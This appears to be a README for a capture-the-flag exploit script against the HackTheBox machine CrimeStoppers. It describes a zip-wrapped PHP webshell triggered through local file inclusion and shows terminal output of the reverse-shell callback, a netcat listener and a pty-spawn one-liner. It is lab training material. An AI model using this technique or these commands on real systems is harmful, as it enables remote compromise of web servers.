## Challenge

[CrimeStoppers](https://www.hackthebox.eu/home/machines/profile/120) from Hackthebox.eu

## Description

Uploads a webshell inside a zip file, and then uses a php filter and local file include invoke the php webshell. Running results in a connection back to the ip and port provided as arguments.

## Reference

Originally published in blog posts: https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html#request_shellsh

## Usage

```
root@kali:/media/sf_CTFs/hackthebox/crimestoppers-10.10.10.80# ./request_shell.sh  10.10.14.139 8081
[*] Creating php shell and zip file
  adding: shell.php (deflated 5%)
[*] Getting PHPSESSID and CSRF token from /?op=upload
[+] Tokens received:
  PIPSESSID: tdjrjl4571r7ouutpn9aae1133
  CSRF:      d8f36f072d960fcb7110a5acb45668eed3faf78e52bbd268597fdd7ed464fb49
[*] Uploading zip though /?op=upload form
[+] File uploaded to ?op=view&secretname=92ec709161beddd0906c2191ee85b0e9217c682b
[*] Initiating callback to 10.10.14.139:8081
```

```
root@kali:/media/sf_CTFs/hackthebox/crimestoppers-10.10.10.80# nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.10.80] 54104
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("bash")'
www-data@ubuntu:/var/www$ pwd
/var/www
```
